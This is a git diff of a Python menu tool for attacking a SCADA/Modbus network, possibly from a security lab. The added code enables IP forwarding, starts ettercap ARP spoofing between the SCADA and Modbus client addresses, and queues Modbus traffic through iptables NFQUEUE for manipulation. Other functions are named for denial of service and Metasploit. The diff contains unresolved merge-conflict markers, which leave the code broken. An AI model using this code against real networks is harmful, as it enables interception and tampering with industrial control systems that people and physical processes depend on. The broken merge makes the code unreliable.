@@ -59,21 +59,30 @@ def clear():
     subprocess.run(["clear"], check=True)
     
 def etterspoof():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print("Checking ettercap...")
-    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
-        print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
+    if subprocess.getoutput("pgrep -x ettercap") == "":
         intrfce = input("Enter Interface Name: ") 
+        # Launch as Daemon
+        cmd = f"ettercap -TqD -i {intrfce} -M arp:remote /{nm_config.scada_ip}// /{nm_config.modcli_ip}//"
+        os.system(cmd)
+        
         time.sleep(2)
+<<<<<<< HEAD
+        if subprocess.getoutput("pgrep -x ettercap") != "":
+            print("[+] Ettercap is now running in the background.")
+        else:
+            print("[!] Failed to start Ettercap. Check container permissions.")
+=======
         
         cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", "arp:remote", f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
         time.sleep(5)
+>>>>>>> 6a09a18d8f482b772819f417af9aea6553ea33c0
     else:
-        print("Ettercap is already running!")
-        time.sleep(1)
-    clear()
-    return
+        print("Ettercap is already active!")
+    time.sleep(1)
 
 def dos():
     def firewall():
@@ -164,7 +173,7 @@ def msfconsole():
 
       
 def fool():
-    
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     def nf():
 
         subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)
@@ -427,6 +436,7 @@ modified by Jesse Cutshall
                 setconfig()
             elif select == "q":
                 print("Exiting...")
+                os.system("sudo killall ettercap")
                 sys.exit(0)
             else:
                 print("Invalid option\n")
